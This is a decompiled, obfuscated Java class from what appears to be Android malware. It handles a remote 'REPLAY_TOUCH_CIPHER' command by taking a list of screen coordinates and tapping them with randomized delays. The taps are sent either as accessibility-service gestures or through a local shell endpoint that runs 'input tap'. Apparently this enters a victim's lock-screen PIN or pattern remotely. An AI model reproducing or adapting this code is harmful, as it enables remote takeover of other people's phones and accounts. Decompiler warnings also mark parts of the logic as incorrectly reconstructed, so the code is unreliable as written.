package p000;

import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import com.storm.safe.rock.service.dqtvuisjd;
import io.socket.engineio.client.transports.PollingXHR;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.Collections;
import java.util.Set;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.jvm.internal.Ref$BooleanRef;
import okhttp3.HttpUrl;
import okio.Segment;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: ig */
/* loaded from: classes2.dex */
public final class C0620ig implements InterfaceC0726jp {
    static {
        new C0618id(null);
    }

    /* JADX WARN: Removed duplicated region for block: B:21:0x009a  */
    /* JADX WARN: Removed duplicated region for block: B:22:0x00b8  */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m213157a3(JSONArray jSONArray, int i, int i2, int i3, uz0 uz0Var) throws JSONException, InterruptedException {
        dqtvuisjd dqtvuisjdVar;
        boolean z;
        CountDownLatch countDownLatch;
        Ref$BooleanRef ref$BooleanRef;
        dqtvuisjd dqtvuisjdVar2 = uz0Var.f60536a0;
        int i4 = 0;
        int i5 = 0;
        while (i4 < i) {
            JSONObject jSONObject = jSONArray.getJSONObject(i4);
            float fOptDouble = (float) jSONObject.optDouble("x", -1.0d);
            float fOptDouble2 = (float) jSONObject.optDouble("y", -1.0d);
            if (fOptDouble < 0.0f || fOptDouble2 < 0.0f) {
                dqtvuisjdVar = dqtvuisjdVar2;
                t60.m214726f4("CipherReplay", "无效坐标点 #" + i4 + ": (" + fOptDouble + ", " + fOptDouble2 + ")");
            } else {
                aq0.f45594a0.getClass();
                Thread.sleep(aq0.f45595a1.mo210498a2(i2, i3 + 1));
                try {
                    Path path = new Path();
                    path.moveTo(fOptDouble, fOptDouble2);
                    GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 50L)).build();
                    countDownLatch = new CountDownLatch(1);
                    ref$BooleanRef = new Ref$BooleanRef();
                    dqtvuisjdVar2.dispatchGesture(gestureDescriptionBuild, new C0619ie(ref$BooleanRef, countDownLatch, 0), null);
                    dqtvuisjdVar = dqtvuisjdVar2;
                } catch (Exception e) {
                    e = e;
                    dqtvuisjdVar = dqtvuisjdVar2;
                }
                try {
                    countDownLatch.await(2L, TimeUnit.SECONDS);
                    z = ref$BooleanRef.f57622a0;
                } catch (Exception e2) {
                    e = e2;
                    t60.m214705c6("CipherReplay", "dispatchClickGesture 失败", e);
                    z = false;
                    if (z) {
                    }
                    i4++;
                    dqtvuisjdVar2 = dqtvuisjdVar;
                }
                if (z) {
                    StringBuilder sbM38b9 = AbstractC0003a2.m38b9("❌ [App] 点击失败 #", i4 + 1, "/", i, ": (");
                    sbM38b9.append(fOptDouble);
                    sbM38b9.append(", ");
                    sbM38b9.append(fOptDouble2);
                    sbM38b9.append(")");
                    t60.m214726f4("CipherReplay", sbM38b9.toString());
                } else {
                    i5++;
                    StringBuilder sbM38b92 = AbstractC0003a2.m38b9("✅ [App] 点击 #", i4 + 1, "/", i, ": (");
                    sbM38b92.append(fOptDouble);
                    sbM38b92.append(", ");
                    sbM38b92.append(fOptDouble2);
                    sbM38b92.append(")");
                    t60.m214702c3("CipherReplay", sbM38b92.toString());
                }
            }
            i4++;
            dqtvuisjdVar2 = dqtvuisjdVar;
        }
        t60.m214714d6("CipherReplay", AbstractC0003a2.m31b2("📱 [正常回放] 完成: ", i5, "/", i, " 成功"));
    }

    /* JADX WARN: Removed duplicated region for block: B:35:0x00f4  */
    /* JADX WARN: Removed duplicated region for block: B:36:0x0114  */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static void m213158a4(JSONArray jSONArray, int i, int i2, int i3) throws JSONException, InterruptedException, IOException {
        int i4;
        int i5;
        int i6;
        boolean zOptBoolean;
        int i7 = 0;
        int i8 = 0;
        while (i7 < i) {
            JSONObject jSONObject = jSONArray.getJSONObject(i7);
            double dOptDouble = jSONObject.optDouble("x", -1.0d);
            double dOptDouble2 = jSONObject.optDouble("y", -1.0d);
            if (dOptDouble < 0.0d || dOptDouble2 < 0.0d) {
                int i9 = i7;
                i4 = i8;
                StringBuilder sb = new StringBuilder("无效坐标点 #");
                i5 = i9;
                sb.append(i5);
                sb.append(": (");
                sb.append(dOptDouble);
                sb.append(", ");
                sb.append(dOptDouble2);
                sb.append(")");
                t60.m214726f4("CipherReplay", sb.toString());
            } else {
                aq0.f45594a0.getClass();
                int i10 = i7;
                Thread.sleep(aq0.f45595a1.mo210498a2(i2, i3 + 1));
                String str = String.format("input tap %.0f %.0f", Arrays.copyOf(new Object[]{Double.valueOf(dOptDouble), Double.valueOf(dOptDouble2)}, 2));
                try {
                    i6 = i10;
                    try {
                        i4 = i8;
                        try {
                            URLConnection uRLConnectionOpenConnection = new URL("http://127.0.0.1:7912/shell?cmd=" + URLEncoder.encode(str, "UTF-8")).openConnection();
                            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
                            HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
                            httpURLConnection.setConnectTimeout(5000);
                            httpURLConnection.setReadTimeout(5000);
                            InputStream inputStream = httpURLConnection.getInputStream();
                            t60.m214694b5(inputStream, "conn.inputStream");
                            String strM210590e1 = b81.m210590e1(new BufferedReader(new InputStreamReader(inputStream, AbstractC0577hd.f56650a0), Segment.SIZE));
                            httpURLConnection.disconnect();
                            JSONObject jSONObject2 = new JSONObject(strM210590e1);
                            zOptBoolean = jSONObject2.optBoolean(PollingXHR.Request.EVENT_SUCCESS, false);
                            if (!zOptBoolean) {
                                JSONObject jSONObjectOptJSONObject = jSONObject2.optJSONObject("data");
                                String str2 = "";
                                String strOptString = jSONObjectOptJSONObject != null ? jSONObjectOptJSONObject.optString("output", "") : null;
                                if (strOptString != null) {
                                    str2 = strOptString;
                                }
                                t60.m214726f4("CipherReplay", "local-service 执行失败: ".concat(str2));
                            }
                        } catch (Exception e) {
                            e = e;
                            t60.m214705c6("CipherReplay", "local-service 调用失败: ".concat(str), e);
                            zOptBoolean = false;
                            if (zOptBoolean) {
                            }
                        }
                    } catch (Exception e2) {
                        e = e2;
                        i4 = i8;
                    }
                } catch (Exception e3) {
                    e = e3;
                    i4 = i8;
                    i6 = i10;
                }
                if (zOptBoolean) {
                    StringBuilder sbM38b9 = AbstractC0003a2.m38b9("❌ [Local] 点击失败 #", i6 + 1, "/", i, ": (");
                    sbM38b9.append(dOptDouble);
                    sbM38b9.append(", ");
                    sbM38b9.append(dOptDouble2);
                    sbM38b9.append(")");
                    t60.m214726f4("CipherReplay", sbM38b9.toString());
                    i5 = i6;
                } else {
                    i8 = i4 + 1;
                    StringBuilder sbM38b92 = AbstractC0003a2.m38b9("✅ [Local] 点击 #", i6 + 1, "/", i, ": (");
                    sbM38b92.append(dOptDouble);
                    sbM38b92.append(", ");
                    sbM38b92.append(dOptDouble2);
                    sbM38b92.append(")");
                    t60.m214702c3("CipherReplay", sbM38b92.toString());
                    i5 = i6;
                    i7 = i5 + 1;
                }
            }
            i8 = i4;
            i7 = i5 + 1;
        }
        t60.m214714d6("CipherReplay", AbstractC0003a2.m31b2("📱 [自动回放] 完成: ", i8, "/", i, " 成功"));
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        Set setSingleton = Collections.singleton("REPLAY_TOUCH_CIPHER");
        t60.m214694b5(setSingleton, "singleton(element)");
        return setSingleton;
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) {
        C1351vv c1351vv = C1351vv.f60710b1;
        if (str.equals("REPLAY_TOUCH_CIPHER")) {
            if (jSONObject == null) {
                t60.m214704c5("CipherReplay", "回放参数为空");
            } else {
                String strOptString = jSONObject.optString("touch_points", HttpUrl.PATH_SEGMENT_ENCODE_SET_URI);
                int iOptInt = jSONObject.optInt("delay_min", 300);
                int iOptInt2 = jSONObject.optInt("delay_max", 600);
                String strOptString2 = jSONObject.optString("mode", "app");
                try {
                    JSONArray jSONArray = new JSONArray(strOptString);
                    int length = jSONArray.length();
                    if (length == 0) {
                        t60.m214726f4("CipherReplay", "触摸点列表为空，跳过回放");
                    } else if (!t60.m214686a2(strOptString2, "local")) {
                        t60.m214714d6("CipherReplay", "📱 [正常回放] 开始回放 " + length + " 个触摸点");
                        m213157a3(jSONArray, length, iOptInt, iOptInt2, uz0Var);
                    } else if (v00.m214888a0()) {
                        t60.m214714d6("CipherReplay", "📱 [自动回放] 开始回放 " + length + " 个触摸点");
                        m213158a4(jSONArray, length, iOptInt, iOptInt2);
                    } else {
                        t60.m214704c5("CipherReplay", "❌ local-service 不可用，无法自动回放");
                    }
                } catch (Exception e) {
                    t60.m214705c6("CipherReplay", "回放失败", e);
                }
            }
            CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        }
        return c1351vv;
    }
}
